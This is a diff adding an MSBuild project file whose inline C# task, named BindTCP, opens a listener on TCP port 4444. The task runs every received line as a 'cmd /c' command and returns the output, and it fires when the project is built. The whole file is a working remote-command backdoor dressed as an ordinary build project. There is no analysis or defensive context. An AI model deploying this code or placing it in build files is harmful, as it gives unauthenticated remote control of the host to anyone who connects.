@@ -1,0 +1,67 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <BindTCP />
+  </Target>
+  <UsingTask
+    TaskName="BindTCP"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Reference Include="System.DirectoryServices" />
+      <Using Namespace="System" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.Text" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.Diagnostics" />
+      <Using Namespace="System.Net.Sockets" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+            int port = 4444;
+            string shell = "cmd";
+            string option = " /c ";
+            TcpListener listener = new TcpListener(IPAddress.Any, port);
+            try {
+                listener.Start();
+            }
+            catch {
+                return true;
+            }
+            while (true){
+                using (Socket socket = listener.AcceptSocket()){
+                    using (NetworkStream stream = new NetworkStream(socket)){
+                        using (StreamReader rdr = new StreamReader(stream)){
+                            while (true){
+                                string cmd = rdr.ReadLine();
+                                if (string.IsNullOrEmpty(cmd))
+                                    break;
+                                if (cmd == "exit")
+                                    return true;
+                                try{
+                                    Process prc = new Process();
+                                    prc.StartInfo = new ProcessStartInfo();
+                                    prc.StartInfo.FileName = shell;
+                                    prc.StartInfo.Arguments = option + cmd.Trim();
+                                    prc.StartInfo.UseShellExecute = false;
+                                    prc.StartInfo.RedirectStandardOutput = true;
+                                    prc.StartInfo.RedirectStandardError = true;
+                                    prc.Start();
+                                    prc.StandardOutput.BaseStream.CopyTo(stream);
+                                    prc.StandardError.BaseStream.CopyTo(stream);
+                                    prc.WaitForExit();
+                                }
+                                catch {
+                                    string error = "Error running command " + cmd + "\n";
+                                    byte[] errorBytes = Encoding.ASCII.GetBytes(error);
+                                    stream.Write(errorBytes, 0, errorBytes.Length);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
